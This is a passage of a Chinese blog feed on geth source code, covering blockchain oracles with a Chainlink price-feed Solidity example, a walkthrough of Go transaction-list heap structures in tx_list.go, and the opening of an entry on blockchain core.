&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>oracle 原理和实现</title>
    <link href="https://www.blog-blockchain.xyz/geth/oracle-introduction/"/>
    <id>https://www.blog-blockchain.xyz/geth/oracle-introduction/</id>
    <published>2022-08-25T03:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.924Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><h2 id="oracle-介绍">oracle 介绍</h2><p>oracle 翻译是预言机，英文中的意思是预卜先知，知晓消息的意思。在区块链里用于合约获取链外的数据。例如你想把比特币转换成美元，如果在链上进行，那么就需要从链外获取比特币和美元的汇率，例如<a href="https://developer.makerdao.com/feeds/">price feed oracles</a>。但是以太坊是封闭的系统，直接与外界交互很容易破坏 EVM 安全性，因此才用了预言机作为中间层，沟通链上和链外。详细可见<a href="https://chain.link/education/blockchain-oracles">chainlink 的文档</a>和<a href="https://ethereum.org/en/developers/docs/oracles/">官方文档</a>。</p><p>在以太坊上，<strong>oracle 是已经部署的智能合约和链外组件，它可以查询 API 提供的信息，然后给其他合约发消息，更新合约的数据</strong>。但是只相信唯一的数据源也是很不可靠的方式，通常是多个数据源。我们可以自己创建，也可以直接使用服务商提供的服务。</p><p>一般 oracle 机制如下：</p><ol><li>到了需要链外数据的时候，合约触发事件。</li><li>链外的接口监听事件的日志。</li><li>链外接口处理事务，然后交易的方式返回数据给合约。</li></ol><p><img src="https://cdn.blog-blockchain.xyz/202203260125659.png" alt="1_Cs3w9iFmhIfkyg3Kg_FzFw"></p><h2 id="oracle-实例">oracle 实例</h2><p>下面是一个例子，从网络导入合约库，获取接口信息，然后创建合约类型 <code>AggregatorV3Interface</code> 的变量 <code>priceFeed</code>，然后结合获取的接口信息，在构造函数里创建在特定地址已经部署好的合约实例，调用函数<code>priceFeed.latestRoundData()</code>，返回的是元组，因此用多个数据接收。这样就获得了最新的 ETH 和 USD 的汇率。而我们导入的合约<code>priceFeed</code> 以及它在链外的配套接口，被称作预言机 oracle。类似的，我们也可以通过 oracle 解决链上难以产生可靠的随机数的问题。</p><p>​ 更多的例子可以看 chainlink 这些提供商，提供的文档，详细地说明了流程。也可以看这个<a href="https://github.com/pedroduartecosta/blockchain-oracle">教程</a>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This example code is designed to quickly deploy an example contract using Remix.</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;https://github.com/smartcontractkit/chainlink/blob/master/evm-contracts/src/v0.6/interfaces/AggregatorV3Interface.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PriceConsumerV3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">AggregatorV3Interface</span> internal priceFeed;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Network: Kovan</span></span><br><span class="line"><span class="comment">     * Aggregator: ETH/USD</span></span><br><span class="line"><span class="comment">     * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        priceFeed = <span class="title class_">AggregatorV3Interface</span>(<span class="number">0x9326BFA02ADD2366b30bacB125260Af641031331</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the latest price</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getLatestPrice</span>(<span class="params"></span>) public view <span class="title function_">returns</span> (int) &#123;</span><br><span class="line">        (</span><br><span class="line">            uint80 roundID,</span><br><span class="line">            int price,</span><br><span class="line">            uint startedAt,</span><br><span class="line">            uint timeStamp,</span><br><span class="line">            uint80 answeredInRound</span><br><span class="line">        ) = priceFeed.<span class="title function_">latestRoundData</span>();</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="确保-oracle-安全的方式">确保 oracle 安全的方式</h2><h3 id="Swiss-Cheese-模型">Swiss-Cheese 模型</h3><p>我们采用多层的结构保证数据的可信性，只有多层结构中只要有一个正常工作，则代表 oracle 提供的数据可信。这样也避免了单一数据来源的最脆弱环节失效容易导致漏洞的问题</p><p><img src="https://cdn.blog-blockchain.xyz/202203260126792.png" alt="1_HCQQSCkvdaUWWG3lYYH9FA"></p><h3 id="多数据源">多数据源</h3><p>可以在链上采用多个数据源，那么只有绝大多数数据都失效或者 oracle 合约本身存在漏洞时，oracle 才会失效。</p><p>实际上，多个可信的数据来源在链上处理是比较耗费 gas 的，因此提出了通过密码学手段，在链外汇总数据，然后发给合约。</p><h3 id="多个-oracle">多个 oracle</h3><p>多用几个 oracle 一起验证安全性会提高很多，但是所有 oracle 都传入不正确的数据时，也可能出问题。当智能合约有多个 oracle 来源时，选择哪一个也是需要设计合理的共识机制的。一般而言，多个 oracle 需要满足：</p><ol><li>每个 oracle 无法确认其他 oracle 的身份。这可以让他们无法串通。</li><li>oracle 之间无法沟通，并且不会互相影响。例如，某个 oracle 有 40% 的投票权，他无法影响其他 oracle，让他们做出相同的选择。</li><li>当所有 oracle 都提供数据之前，每个 oracle 提供的数据都是无法确认的。这相当于在投票时，只有每个人都投完票之后，才公布结果。</li><li>oracle 都带有权重，防止有人控制大量节点，成为分布式系统中的 “大多数”。</li></ol><h3 id="利益一致">利益一致</h3><p>完全区中心化的 oracle 是很危险的，我们无法预见数据提供者的行为。但是，可以尝试将 oracle 融入类似于挖矿的过程，如果执行者按规定执行，则给予奖励，否则就会产生损失。</p><h2 id="Oracle-可能的漏洞">Oracle 可能的漏洞</h2><p>​ 单纯创建一个点对点的去中心化系统并不难，但是保证在去中心化系统中某些必要组件的可信性，却是一个难题。</p><ul><li><p>为了节省验证数据的计算开销，大节点可能在收集数据之后，在链外分享给它控制的节点。如果大节点收集的数据是错误的，那么拥有错误信息的节点容易占大多数，形成另类的女巫攻击。</p></li><li><p>恶意的 oracle 可能会抄袭别人的数据。</p></li><li><p>单一的 oracle 的情况，如果数据有损坏，那么在链上是很难检测的。</p></li><li><p>区块链数据都是公开的，即使每个 oracle 的数据加密，执行过程中很难保证敏感的信息不会泄露。</p><p>详细可参考 <a href="https://medium.com/fabric-ventures/decentralised-oracles-a-comprehensive-overview-d3168b9a8841">Decentralised Oracles: a comprehensive overview</a></p></li></ul><h2 id="Oracle-的源码实现">Oracle 的源码实现</h2><p>从类型定义可见，checkpoint oracle 实际上是一个合约，它的方法也是和普通合约封装类似，</p><ol><li>通过地址绑定到已部署的合约，调用该合约。</li><li>合约地址。</li></ol><p>特殊的在于：</p><ol><li>检查某个状态阶段的可信点（检查点）。</li><li>生成新的检查点。</li></ol><p>附检查点的含义：oracle 的检查点，实际上是一个标记，用于确认这个状态和之前的状态是可信的。在区块链上，检查点往往是有足够的可信实体共同签名后，正式生成。它意味着检查点的状态是不可逆的，无条件可信的。这也是区块链防止造假的手段之一。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>TxList 解读</title>
    <link href="https://www.blog-blockchain.xyz/geth/txlist/"/>
    <id>https://www.blog-blockchain.xyz/geth/txlist/</id>
    <published>2022-08-25T03:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.924Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><blockquote><p>本文旨在分析清楚 tx_list.go 中这个工具包里面的重要代码</p></blockquote><h2 id="堆排序">堆排序</h2><p>以下为<code>tx_list.go</code>中的<code>heap.Interface</code>的全部实现代码，非常标准，和默认的一样；</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//heap的整个实现过程</span></span><br><span class="line"><span class="keyword">type</span> nonceHeap []<span class="type">uint64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h nonceHeap)</span></span> Len() <span class="type">int</span>           &#123; <span class="keyword">return</span> <span class="built_in">len</span>(h) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h nonceHeap)</span></span> Less(i, j <span class="type">int</span>) <span class="type">bool</span> &#123; <span class="keyword">return</span> h[i] &lt; h[j] &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h nonceHeap)</span></span> Swap(i, j <span class="type">int</span>)      &#123; h[i], h[j] = h[j], h[i] &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *nonceHeap)</span></span> Push(x <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">*h = <span class="built_in">append</span>(*h, x.(<span class="type">uint64</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *nonceHeap)</span></span> Pop() <span class="keyword">interface</span>&#123;&#125; &#123;</span><br><span class="line">old := *h</span><br><span class="line">n := <span class="built_in">len</span>(old)</span><br><span class="line">x := old[n<span class="number">-1</span>]</span><br><span class="line">*h = old[<span class="number">0</span> : n<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下展示<code>heap.Interface</code>的结构：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Interface <span class="keyword">interface</span> &#123;</span><br><span class="line">    sort.Interface</span><br><span class="line">    Push(x <span class="keyword">interface</span>&#123;&#125;) <span class="comment">// add x as element Len()</span></span><br><span class="line">    Pop() <span class="keyword">interface</span>&#123;&#125;   <span class="comment">// remove and return element Len() - 1.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>sort.Interface</code>这个接口里包含<code>Len() Less() Swap()</code>这三个方法，也就是对应上面的前三个方法；</p><p>加上后面的<code>Push() Pop()</code>两个方法，也就是我们实现了<code>heap.Interface</code>这个接口；</p><p>然后我们就可以使用<code>heap</code>包里面的相关功能性函数（因为他们的参数要求基本上都包含<code>heap.Interface</code>这个接口)，<code>heap</code>包代码量非常少，算上注释才一百多行，很容易也推荐看完；</p><p>在这里附上一段试验的源码以供参考：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;container/heap&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> intHeap []<span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a intHeap)</span></span> Len() <span class="type">int</span>           &#123; <span class="keyword">return</span> <span class="built_in">len</span>(a) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a intHeap)</span></span> Swap(i, j <span class="type">int</span>)      &#123; a[i], a[j] = a[j], a[i] &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a intHeap)</span></span> Less(i, j <span class="type">int</span>) <span class="type">bool</span> &#123; <span class="keyword">return</span> a[i] &lt; a[j] &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *intHeap)</span></span> Push(x <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">*s = <span class="built_in">append</span>(*s, x.(<span class="type">int</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *intHeap)</span></span> Pop() <span class="keyword">interface</span>&#123;&#125; &#123;</span><br><span class="line">old := *s</span><br><span class="line">n := <span class="built_in">len</span>(old)</span><br><span class="line">x := old[n<span class="number">-1</span>]</span><br><span class="line">*s = old[<span class="number">0</span> : n<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//必须要是初始化为指针类型的 这样才算是实现了该接口 因为上面的参数有指针类型的</span></span><br><span class="line">res := &amp;intHeap&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>&#125;</span><br><span class="line"><span class="comment">//s:=heap.Interface(res)</span></span><br><span class="line">heap.Init(res)</span><br><span class="line">fmt.Println(res)</span><br><span class="line">heap.Push(res,<span class="number">3</span>)</span><br><span class="line">fmt.Println(res)</span><br><span class="line">fmt.Println((*res)[<span class="number">4</span>])</span><br><span class="line">sort.Sort(res)</span><br><span class="line">fmt.Println(res)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="函数功能解析">函数功能解析</h2><h3 id="txSortedMap">txSortedMap</h3><p>具体的结构如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> txSortedMap <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">//建立一个nonce-&gt;transaction的map</span></span><br><span class="line">items <span class="keyword">map</span>[<span class="type">uint64</span>]*types.Transaction <span class="comment">// Hash map storing the transaction data</span></span><br><span class="line">index *nonceHeap                    <span class="comment">// Heap of nonces of all the stored transactions (non-strict mode)</span></span><br><span class="line">cache types.Transactions            <span class="comment">// Cache of the transactions already sorted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下为其对应的所有方法：</p><ol><li><p><code>newTxSortedMap()</code> 进行初始化并返回初始化后的<code>*txSortedMap</code></p></li><li><p><code>Get(nonce uint64)</code>获取指定<code>nonce</code>的交易并返回该笔交易</p></li><li><p><code>Put(tx *types.transaction)</code>将该笔交易该笔交易添加到<code>txSortedMap</code>中，无论之前是否存在</p></li><li><p><code>Foward(threshold uint64)</code>将低于这个门槛的<code>nonce</code>的交易全部剔除</p></li><li><p><code>reheap()</code>根据当前的<code>map</code>重新进行<code>nonceheap</code>的排序</p></li><li><p><code>filter(filter func(*types.Transaction) bool)</code>其中的参数<code>filter func(*types.Transaction) bool)</code></p><p>它的源码是<code>func(tx *types.Transaction) bool &#123; return tx.Nonce() &gt; lowest &#125;</code></p><p>我们可以发现该函数的作用其实为了过滤<code>nonce</code>小于最低要求的交易，而<code>Filter(filter func(*types.Transaction) bool)</code>调用了以上的函数，所以功能差不多</p></li><li><p><code>Cap(threshold int)</code>如果该<code>map</code>中的交易数量超过了限制，就删除最高<code>nonce</code>的交易直至数量达到要求，并返回删除掉的<code>drops</code></p></li><li><p><code>Remove(nonce uint64)</code>删除成功则返回<code>true</code>,没有找到就返回<code>false</code></p></li><li><p><code>Ready(start uint64)</code>准备好<code>nonce</code>高于<code>start</code>并且<code>连续</code>的交易</p></li><li><p><code>Len()</code>返回<code>map</code>的大小</p></li><li><p><code>Flatten()</code>获取全部的交易，<code>flatten()</code>将全部按照<code>nonce</code>排序好的交易进行缓存</p></li><li><p><code>LastElement()</code>返回<code>cashe</code>中<code>nonce值</code>最高的交易</p></li></ol><hr><h3 id="txList">txList</h3><p>具体结构如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> txList <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="comment">//nonce是否严格连续</span></span><br><span class="line">strict <span class="type">bool</span>         <span class="comment">// Whether nonces are strictly continuous or not</span></span><br><span class="line"><span class="comment">//nonce</span></span><br><span class="line">    txs    *txSortedMap <span class="comment">// Heap indexed sorted hash map of the transactions</span></span><br><span class="line"></span><br><span class="line">costcap *big.Int <span class="comment">// Price of the highest costing transaction (reset only if exceeds balance)</span></span><br><span class="line">gascap  <span class="type">uint64</span>   <span class="comment">// Gas limit of the highest spending transaction (reset only if exceeds block limit)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重要函数如下：</p><ol><li><code>Overlaps(tx *types.Transaction)</code>若是已有这笔交易就返回<code>true</code>，否则返回<code>false</code></li><li><code>Add(tx *types.Transaction,priceBump uint64)</code>若是已有这笔交易就尝试加入，不存在就直接加入，返回交易<code>true old</code></li><li><code>Filter(costLimit *big.Int,gasLimit uint64)</code>过滤掉拥有过高的<code>cost</code>或者<code>gas</code>的交易，同时过滤掉后面<code>nonce</code>不连续的交易</li><li><code>Remove(tx *types.Transaction)</code>尝试移除掉指定的交易并移除后面<code>nonce</code>值不连续的交易</li></ol><hr><h3 id="priceHeap">priceHeap</h3><p>具体结构如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> priceHeap <span class="keyword">struct</span> &#123;</span><br><span class="line">baseFee *big.Int <span class="comment">// heap should always be re-sorted after baseFee is changed</span></span><br><span class="line">list    []*types.Transaction</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现了<code>heap.Interface</code>这个接口，排序方式是<code>先比较gasFee,再之tipFee</code></p><hr><h3 id="txPricedList">txPricedList</h3><p>具体结构如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> txPricedList <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="comment">//一个过时的计数器</span></span><br><span class="line">stales <span class="type">int64</span></span><br><span class="line"></span><br><span class="line">all              *txLookup  <span class="comment">// Pointer to the map of all transactions</span></span><br><span class="line">urgent, floating priceHeap  <span class="comment">// Heaps of prices of all the stored **remote** transactions</span></span><br><span class="line">reheapMu         sync.Mutex <span class="comment">// Mutex asserts that only one routine is reheaping the list</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先提一下，本部分源码中大量使用了原子操作，<code>Go语言</code>中提供的原子操作都是非侵入式的，在标准库代码包<code>sync/atomic</code>中提供了相关的原子函数,具体功能如下：</p><p>原子操作即是进行过程中不能被中断的操作，针对某个值的原子操作在被进行的过程中，CPU 绝不会再去进行其他的针对该值的操作。为了实现这样的严谨性，原子操作仅会由一个独立的 CPU 指令代表和完成。原子操作是无锁的，常常直接通过 CPU 指令直接实现。 事实上，其它同步技术的实现常常依赖于原子操作。</p><p>现在理解不来为何 <code>priceHeap</code>里要有<code>urgent 和 floating</code>这两个 ，（注意：应该是新增的，网上找不到资料；）</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>blockchain核心</title>
    <link href="https://www.blog-blockchain.xyz/geth/blockchain-core/"/>
    <id>https://www.blog-blockchain.xyz/geth/blockchain-core/</id>
    <published>2022-08-25T02:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.923Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><blockquote><p>参考： <a href="https://www.cnblogs.com/1314xf/articles/13827186.html">以太坊 blockchain 源码分析 - mindcarver - 博客园 (cnblogs.com)</a></p></blockquote><blockquote><p>主要部分转载：<a href="https://www.cnblogs.com/1314xf/p/13827186.html">以太坊 blockchain 源码分析</a></p></blockquote><h2 id="blockchain-关键元素">blockchain 关键元素</h2><ul><li>db：持久化到底层数据储存，即 leveldb（注意不是 MySQL）（源码<code>core/rawdb</code>）；(参考文章：)<a href="https://zhuanlan.zhihu.com/p/322520485">Leveldb 基本介绍和使用指南 - 知乎 (zhihu.com)</a> 以及对应的百科 [LevelDB_百度百科 (<a href="http://baidu.com">baidu.com</a>)](<a href="https://baike.baidu.com/item/LevelDB/6416354#:~:text=">https://baike.baidu.com/item/LevelDB/6416354#:~:text=</a> Leveldb 是一个 google 实现的非常高效的 kv 数据库，目前的版本 1.2 能够支持 billion 